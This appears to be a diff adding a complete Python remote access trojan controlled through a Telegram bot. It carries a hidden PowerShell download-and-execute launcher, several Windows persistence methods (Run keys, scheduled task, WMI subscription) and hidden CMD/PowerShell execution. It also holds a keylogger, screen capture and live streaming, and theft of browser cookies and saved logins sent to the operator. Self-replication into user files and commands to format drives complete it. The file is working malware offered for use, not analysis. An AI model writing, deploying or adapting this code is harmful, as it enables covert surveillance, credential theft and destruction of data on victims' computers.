@@ -1,0 +1,653 @@
+# RAT Complete – Telegram C2 with full control, persistence, exfiltration, screenshot, live stream, keylogger, self-replication, and hidden CMD/PS execution.
+# Execute via: powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/rat.txt')"
+
+import os, sys, subprocess, requests, json, time, socket, platform, threading, shutil, sqlite3, winreg, ctypes, random, base64, re
+from pathlib import Path
+from datetime import datetime
+from urllib.parse import urlparse
+
+# ============================================================
+# CONFIG – CHANGE THESE
+# ============================================================
+BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
+CHAT_ID = "PUT_YOUR_CHAT_ID_HERE"
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+# ============================================================
+
+# === GLOBALS ===
+VICTIM_ID = socket.gethostname() + "_" + os.getlogin()
+BASE_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
+STARTUP_DIR = os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+APPDATA = os.getenv('APPDATA')
+LOCALAPPDATA = os.getenv('LOCALAPPDATA')
+TEMP = os.getenv('TEMP')
+USERPROFILE = os.getenv('USERPROFILE')
+
+# === TELEGRAM HELPERS ===
+def send_message(text, parse_mode='Markdown'):
+    try:
+        requests.post(f"{TELEGRAM_API}/sendMessage", json={'chat_id': CHAT_ID, 'text': text, 'parse_mode': parse_mode}, timeout=10)
+    except: pass
+
+def send_document(file_path, caption=""):
+    try:
+        with open(file_path, 'rb') as f:
+            requests.post(f"{TELEGRAM_API}/sendDocument", files={'document': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=30)
+        return True
+    except: return False
+
+def send_photo(file_path, caption=""):
+    try:
+        with open(file_path, 'rb') as f:
+            requests.post(f"{TELEGRAM_API}/sendPhoto", files={'photo': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=30)
+        return True
+    except: return False
+
+def send_video(file_path, caption=""):
+    try:
+        with open(file_path, 'rb') as f:
+            requests.post(f"{TELEGRAM_API}/sendVideo", files={'video': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=30)
+        return True
+    except: return False
+
+def send_audio(file_path, caption=""):
+    try:
+        with open(file_path, 'rb') as f:
+            requests.post(f"{TELEGRAM_API}/sendAudio", files={'audio': f}, data={'chat_id': CHAT_ID, 'caption': caption}, timeout=30)
+        return True
+    except: return False
+
+def send_action(action='typing'):
+    try:
+        requests.post(f"{TELEGRAM_API}/sendChatAction", json={'chat_id': CHAT_ID, 'action': action})
+    except: pass
+
+# === SYSTEM INFO ===
+def get_system_info():
+    try:
+        public_ip = requests.get('https://api.ipify.org', timeout=5).text
+    except:
+        public_ip = "Unknown"
+    try:
+        private_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        private_ip = "Unknown"
+    return f"""
+📌 **Victim:** `{VICTIM_ID}`
+🖥️ **OS:** {platform.system()} {platform.release()} ({platform.version()})
+💻 **Hostname:** {socket.gethostname()}
+🌐 **Public IP:** {public_ip}
+🏠 **Private IP:** {private_ip}
+👤 **User:** {os.getlogin()}
+📂 **CWD:** {os.getcwd()}
+📅 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+"""
+
+# === PERSISTENCE (MULTIPLE METHODS) ===
+def add_persistence():
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        # 1) Startup folder
+        startup_path = os.path.join(STARTUP_DIR, "SystemHelper.py")
+        if not os.path.exists(startup_path):
+            shutil.copyfile(script_path, startup_path)
+        # 2) Registry (CurrentUser\Run)
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
+        except: pass
+        # 3) Registry (LocalMachine\Run) – requires admin
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
+        except: pass
+        # 4) Scheduled Task
+        try:
+            task_name = "WindowsSystemCheck"
+            subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /f /rl HIGHEST', shell=True, capture_output=True)
+        except: pass
+        # 5) WMI Persistence (if admin)
+        try:
+            wmi_script = f'''
+            $filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
+            $filter.QueryLanguage = "WQL"
+            $filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+            $filter.Name = "SystemCheck"
+            $filter.EventNamespace = 'root\cimv2'
+            $result = $filter.Put()
+            $consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
+            $consumer.Name = 'SystemCheckConsumer'
+            $consumer.CommandLineTemplate = "python {script_path}"
+            $consumer.Put()
+            $binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
+            $binding.Filter = $result.Path
+            $binding.Consumer = $consumer.Path
+            $binding.Put()
+            '''
+            subprocess.run(['powershell', '-Command', wmi_script], shell=True, capture_output=True)
+        except: pass
+    except Exception as e:
+        send_message(f"[!] Persistence error: {e}")
+
+# === COMMAND EXECUTION (normal) ===
+def execute_command(cmd):
+    try:
+        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60, encoding='utf-8', errors='ignore')
+        return result
+    except subprocess.TimeoutExpired:
+        return "[!] Command timeout (60s)."
+    except Exception as e:
+        return f"[!] Error: {e}"
+
+# === HIDDEN COMMAND EXECUTION (no window, no user visibility) ===
+def execute_hidden_cmd(cmd):
+    """تنفيذ أمر CMD مخفي تماماً – بدون نافذة وبدون ظهور للمستخدم"""
+    try:
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 0
+        result = subprocess.check_output(
+            cmd,
+            shell=True,
+            stderr=subprocess.STDOUT,
+            timeout=60,
+            encoding='utf-8',
+            errors='ignore',
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        return result
+    except subprocess.TimeoutExpired:
+        return "[!] Command timeout."
+    except Exception as e:
+        return f"[!] Error: {e}"
+
+def execute_hidden_ps(cmd):
+    """تنفيذ أمر PowerShell مخفي تماماً"""
+    try:
+        ps_cmd = f'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "{cmd}"'
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 0
+        result = subprocess.check_output(
+            ps_cmd,
+            shell=True,
+            stderr=subprocess.STDOUT,
+            timeout=60,
+            encoding='utf-8',
+            errors='ignore',
+            startupinfo=startupinfo,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        return result
+    except subprocess.TimeoutExpired:
+        return "[!] Command timeout."
+    except Exception as e:
+        return f"[!] Error: {e}"
+
+# === FILE SYSTEM ===
+def list_directory(path):
+    try:
+        if not os.path.exists(path):
+            return f"[!] Path not found: {path}"
+        files = os.listdir(path)
+        result = f"📁 **{path}**\n"
+        for f in files[:100]:
+            full = os.path.join(path, f)
+            if os.path.isdir(full):
+                result += f"📁 {f}/\n"
+            else:
+                size = os.path.getsize(full)
+                result += f"📄 {f} ({size} bytes)\n"
+        if len(files) > 100:
+            result += f"... and {len(files)-100} more"
+        return result
+    except Exception as e:
+        return f"[!] Error: {e}"
+
+def send_file_from_victim(file_path):
+    if os.path.exists(file_path) and os.path.isfile(file_path):
+        if os.path.getsize(file_path) < 50 * 1024 * 1024:  # 50MB limit
+            return send_document(file_path)
+        else:
+            send_message("[!] File too large (>50MB)")
+            return False
+    else:
+        send_message(f"[!] File not found: {file_path}")
+        return False
+
+def send_folder(folder_path):
+    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
+        send_message(f"[!] Folder not found: {folder_path}")
+        return
+    files = []
+    for root, dirs, filenames in os.walk(folder_path):
+        for f in filenames:
+            full = os.path.join(root, f)
+            if os.path.getsize(full) < 20 * 1024 * 1024:
+                files.append(full)
+    sent = 0
+    for f in files[:50]:
+        if send_document(f):
+            sent += 1
+            time.sleep(0.5)
+    send_message(f"[+] Sent {sent} files from {folder_path}")
+
+def delete_file_or_folder(path):
+    try:
+        if os.path.isfile(path):
+            os.remove(path)
+            return f"[+] Deleted file: {path}"
+        elif os.path.isdir(path):
+            shutil.rmtree(path)
+            return f"[+] Deleted folder: {path}"
+        else:
+            return f"[!] Not found: {path}"
+    except Exception as e:
+        return f"[!] Delete error: {e}"
+
+def download_file(url, save_path):
+    try:
+        r = requests.get(url, stream=True, timeout=30)
+        if r.status_code == 200:
+            with open(save_path, 'wb') as f:
+                for chunk in r.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            return f"[+] Downloaded to {save_path}"
+        else:
+            return f"[!] Download failed: HTTP {r.status_code}"
+    except Exception as e:
+        return f"[!] Download error: {e}"
+
+# === SCREENSHOT ===
+def take_screenshot():
+    try:
+        import pyautogui
+        path = os.path.join(TEMP, "screenshot.png")
+        pyautogui.screenshot(path)
+        send_photo(path, caption="📸 Screenshot")
+        os.remove(path)
+        return True
+    except Exception as e:
+        send_message(f"[!] Screenshot error: {e}")
+        return False
+
+# === LIVE SCREEN STREAM ===
+def live_screen():
+    send_message("📡 **Live screen streaming started** (5s interval)")
+    try:
+        import pyautogui
+        while True:
+            path = os.path.join(TEMP, "live.png")
+            pyautogui.screenshot(path)
+            send_photo(path)
+            os.remove(path)
+            time.sleep(5)
+    except Exception as e:
+        send_message(f"[!] Live stream error: {e}")
+
+# === KEYLOGGER ===
+keylogger_running = False
+keylog_file = os.path.join(TEMP, "keylog.txt")
+
+def start_keylogger():
+    global keylogger_running
+    try:
+        from pynput import keyboard
+        def on_press(key):
+            try:
+                with open(keylog_file, 'a', encoding='utf-8') as f:
+                    if hasattr(key, 'char') and key.char:
+                        f.write(key.char)
+                    else:
+                        f.write(f" [{key}] ")
+            except:
+                pass
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        keylogger_running = True
+        send_message("[+] Keylogger started")
+        return listener
+    except Exception as e:
+        send_message(f"[!] Keylogger error: {e}")
+        return None
+
+def stop_keylogger():
+    global keylogger_running
+    keylogger_running = False
+    send_message("[-] Keylogger stopped")
+
+def send_keylog():
+    if os.path.exists(keylog_file) and os.path.getsize(keylog_file) > 0:
+        send_document(keylog_file, caption="📝 Keylog")
+    else:
+        send_message("[!] No keylog data")
+
+# === STEAL BROWSER DATA ===
+def steal_browser_data():
+    # Chrome / Edge (Chromium)
+    chrome_paths = [
+        LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\Cookies",
+        LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\Login Data",
+        LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\History",
+        LOCALAPPDATA + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
+        LOCALAPPDATA + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+    ]
+    for p in chrome_paths:
+        if os.path.exists(p):
+            send_document(p)
+    # Firefox
+    firefox_profiles = Path(APPDATA) / "Mozilla/Firefox/Profiles"
+    if firefox_profiles.exists():
+        for profile in firefox_profiles.glob("*.default*"):
+            for f in ["cookies.sqlite", "logins.json", "key4.db"]:
+                file_path = profile / f
+                if file_path.exists():
+                    send_document(str(file_path))
+    # Opera
+    opera_path = APPDATA + "\\Opera Software\\Opera Stable\\Cookies"
+    if os.path.exists(opera_path):
+        send_document(opera_path)
+
+# === SELF-REPLICATION (SPREAD TO OTHER FILES) ===
+def replicate():
+    try:
+        script_content = open(sys.argv[0], 'r', encoding='utf-8').read()
+        infect_dirs = [
+            USERPROFILE + "\\Desktop",
+            USERPROFILE + "\\Documents",
+            USERPROFILE + "\\Downloads",
+            USERPROFILE + "\\Pictures",
+        ]
+        for directory in infect_dirs:
+            if os.path.exists(directory):
+                for root, dirs, files in os.walk(directory):
+                    for file in files:
+                        if file.endswith(".py") and file != os.path.basename(sys.argv[0]):
+                            file_path = os.path.join(root, file)
+                            try:
+                                with open(file_path, 'r', encoding='utf-8') as f:
+                                    if "SystemHelper" in f.read():
+                                        continue
+                                with open(file_path, 'a', encoding='utf-8') as f:
+                                    f.write("\n# INFECTED\n" + script_content[:500])
+                            except:
+                                pass
+        # Also infect .exe files (just copy)
+        for directory in infect_dirs:
+            if os.path.exists(directory):
+                for file in os.listdir(directory):
+                    if file.endswith(".exe") and random.random() < 0.1:
+                        target = os.path.join(directory, file + "_backup.exe")
+                        try:
+                            shutil.copy2(sys.argv[0], target)
+                        except:
+                            pass
+    except:
+        pass
+
+# === SYSTEM CONTROL ===
+def shutdown_pc():
+    os.system("shutdown /s /t 1")
+def restart_pc():
+    os.system("shutdown /r /t 1")
+def format_drive(drive="C:"):
+    os.system(f"format {drive} /q /y")
+
+# === PROCESS MANAGEMENT ===
+def list_processes():
+    try:
+        result = subprocess.check_output("tasklist", shell=True, encoding='utf-8', errors='ignore')
+        return result
+    except Exception as e:
+        return f"[!] Error: {e}"
+
+def kill_process(pid):
+    try:
+        os.system(f"taskkill /PID {pid} /F")
+        return f"[+] Killed PID {pid}"
+    except Exception as e:
+        return f"[!] Error: {e}"
+
+# === COMMAND PARSER ===
+def process_command(cmd):
+    cmd = cmd.strip()
+    if cmd.startswith("/"):
+        parts = cmd.split()
+        command = parts[0].lower()
+        args = parts[1:] if len(parts) > 1 else []
+
+        # === HELP ===
+        if command == "/help":
+            return """
+**Available Commands:**
+/info – System info
+/screenshot – Take screenshot
+/live – Start live screen stream
+/stop – Stop live stream
+/keylog_start – Start keylogger
+/keylog_stop – Stop keylogger
+/keylog_send – Send keylog file
+/cmd <command> – Execute shell command (visible window)
+/hidecmd <command> – Execute CMD hidden (no window)
+/hideps <command> – Execute PowerShell hidden
+/list <path> – List directory contents
+/get <file> – Download file from victim
+/getfolder <folder> – Download entire folder
+/delete <path> – Delete file/folder
+/upload <url> <save_path> – Download file from URL
+/processes – List running processes
+/kill <pid> – Kill process by PID
+/shutdown – Shutdown PC
+/restart – Restart PC
+/format <drive> – Format drive (default C:)
+/steal – Steal browser cookies/passwords
+/replicate – Spread to other files
+/persist – Re-add persistence
+/clean – Remove persistence (not fully implemented)
+"""
+
+        # === INFO ===
+        elif command == "/info":
+            return get_system_info()
+
+        # === SCREENSHOT ===
+        elif command == "/screenshot":
+            threading.Thread(target=take_screenshot, daemon=True).start()
+            return "[*] Taking screenshot..."
+
+        # === LIVE SCREEN ===
+        elif command == "/live":
+            threading.Thread(target=live_screen, daemon=True).start()
+            return "[*] Starting live screen stream..."
+
+        # === KEYLOGGER ===
+        elif command == "/keylog_start":
+            threading.Thread(target=start_keylogger, daemon=True).start()
+            return "[*] Starting keylogger..."
+        elif command == "/keylog_stop":
+            stop_keylogger()
+            return "[*] Keylogger stopped."
+        elif command == "/keylog_send":
+            send_keylog()
+            return "[*] Sending keylog..."
+
+        # === NORMAL COMMAND (visible) ===
+        elif command == "/cmd":
+            if args:
+                full_cmd = " ".join(args)
+                return f"```\n{execute_command(full_cmd)}\n```"
+            else:
+                return "[!] Usage: /cmd <command>"
+
+        # === HIDDEN CMD (no window) ===
+        elif command == "/hidecmd":
+            if args:
+                full_cmd = " ".join(args)
+                result = execute_hidden_cmd(full_cmd)
+                return f"✅ **CMD executed (hidden)**\n```\n{result}\n```"
+            else:
+                return "[!] Usage: /hidecmd <command>"
+
+        # === HIDDEN POWERSHELL ===
+        elif command == "/hideps":
+            if args:
+                full_cmd = " ".join(args)
+                result = execute_hidden_ps(full_cmd)
+                return f"✅ **PowerShell executed (hidden)**\n```\n{result}\n```"
+            else:
+                return "[!] Usage: /hideps <command>"
+
+        # === LIST ===
+        elif command == "/list":
+            path = args[0] if args else "."
+            return list_directory(path)
+
+        # === GET FILE ===
+        elif command == "/get":
+            if args:
+                threading.Thread(target=send_file_from_victim, args=(args[0],), daemon=True).start()
+                return f"[*] Sending file: {args[0]}"
+            else:
+                return "[!] Usage: /get <file_path>"
+
+        # === GET FOLDER ===
+        elif command == "/getfolder":
+            if args:
+                threading.Thread(target=send_folder, args=(args[0],), daemon=True).start()
+                return f"[*] Sending folder: {args[0]}"
+            else:
+                return "[!] Usage: /getfolder <folder_path>"
+
+        # === DELETE ===
+        elif command == "/delete":
+            if args:
+                return delete_file_or_folder(args[0])
+            else:
+                return "[!] Usage: /delete <path>"
+
+        # === UPLOAD (download from URL to victim) ===
+        elif command == "/upload":
+            if len(args) >= 2:
+                return download_file(args[0], args[1])
+            else:
+                return "[!] Usage: /upload <url> <save_path>"
+
+        # === PROCESSES ===
+        elif command == "/processes":
+            return f"```\n{list_processes()}\n```"
+
+        # === KILL PROCESS ===
+        elif command == "/kill":
+            if args:
+                return kill_process(args[0])
+            else:
+                return "[!] Usage: /kill <pid>"
+
+        # === SHUTDOWN ===
+        elif command == "/shutdown":
+            threading.Thread(target=shutdown_pc, daemon=True).start()
+            return "[*] Shutting down..."
+
+        # === RESTART ===
+        elif command == "/restart":
+            threading.Thread(target=restart_pc, daemon=True).start()
+            return "[*] Restarting..."
+
+        # === FORMAT ===
+        elif command == "/format":
+            drive = args[0] if args else "C:"
+            threading.Thread(target=format_drive, args=(drive,), daemon=True).start()
+            return f"[*] Formatting drive {drive}..."
+
+        # === STEAL BROWSER DATA ===
+        elif command == "/steal":
+            threading.Thread(target=steal_browser_data, daemon=True).start()
+            return "[*] Stealing browser data..."
+
+        # === REPLICATE ===
+        elif command == "/replicate":
+            threading.Thread(target=replicate, daemon=True).start()
+            return "[*] Replicating..."
+
+        # === PERSIST ===
+        elif command == "/persist":
+            add_persistence()
+            return "[*] Persistence re-added."
+
+        # === CLEAN (remove persistence) ===
+        elif command == "/clean":
+            try:
+                os.remove(os.path.join(STARTUP_DIR, "SystemHelper.py"))
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
+                    winreg.DeleteValue(k, "WindowsUpdate")
+                return "[-] Cleaned startup and registry entries."
+            except:
+                return "[!] Clean failed."
+
+        else:
+            return f"[!] Unknown command: {command} (type /help for list)"
+    else:
+        # Non-command – treat as shell command (visible)
+        return f"```\n{execute_command(cmd)}\n```"
+
+# === MAIN RAT LOOP ===
+def main():
+    # Hide console window (if compiled to .exe)
+    if platform.system() == "Windows":
+        try:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+
+    # Send initial info
+    send_message(f"✅ **Victim Connected!**\n{get_system_info()}")
+
+    # Persistence
+    add_persistence()
+
+    # Background threads
+    threading.Thread(target=replicate, daemon=True).start()
+    threading.Thread(target=steal_browser_data, daemon=True).start()
+
+    # Command processing via long polling (using getUpdates)
+    last_update_id = 0
+    send_message("[*] RAT is ready. Send /help for commands.")
+
+    while True:
+        try:
+            # Get updates from Telegram
+            url = f"{TELEGRAM_API}/getUpdates"
+            params = {'offset': last_update_id + 1, 'timeout': 30, 'allowed_updates': ['message']}
+            resp = requests.get(url, params=params, timeout=35)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data['ok']:
+                    for update in data['result']:
+                        last_update_id = update['update_id']
+                        if 'message' in update and 'text' in update['message']:
+                            msg = update['message']
+                            chat_id = msg['chat']['id']
+                            if str(chat_id) != CHAT_ID:
+                                continue  # Ignore other chats
+                            cmd = msg['text'].strip()
+                            # Process command
+                            result = process_command(cmd)
+                            send_message(result, parse_mode='Markdown' if result.startswith('```') else 'Markdown')
+            else:
+                send_message(f"[!] Telegram API error: {resp.status_code}")
+                time.sleep(5)
+        except Exception as e:
+            send_message(f"[!] Main loop error: {e}")
+            time.sleep(10)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        # Send error to Telegram if possible
+        try:
+            requests.post(f"{TELEGRAM_API}/sendMessage", json={'chat_id': CHAT_ID, 'text': f"[!] Fatal error: {e}"}, timeout=10)
+        except:
+            pass
+        raise
